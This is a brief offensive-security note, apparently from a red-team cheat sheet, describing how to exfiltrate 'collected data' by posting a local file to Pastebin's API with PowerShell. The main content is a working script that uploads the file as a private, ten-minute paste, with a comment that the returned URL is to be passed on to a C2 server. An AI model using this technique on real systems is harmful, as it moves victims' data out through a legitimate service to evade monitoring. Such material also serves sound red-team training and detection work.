# Send Data via Pastebin

We can send collected data to Pastebin and see the contents via the paste. The PowerShell command is below:

```powershell
$api_dev_key = "<API_KEY>"
$api_paste_code = Get-Content -Raw -Path ".\collected_data.txt"

$response = Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body @{
    api_option = "paste"
    api_dev_key = $api_dev_key
    api_paste_code = $api_paste_code
    api_paste_name = "collected_data.txt"
    api_paste_private = 1
    api_paste_expire_date = "10M"
    api_paste_format = "text"
}

$response.Content
# the output displays the URL of our paste, so we need to send this URL to C2 server or other methods.
```

## Resources

- [Pastebin API Documentations](https://pastebin.com/doc_api)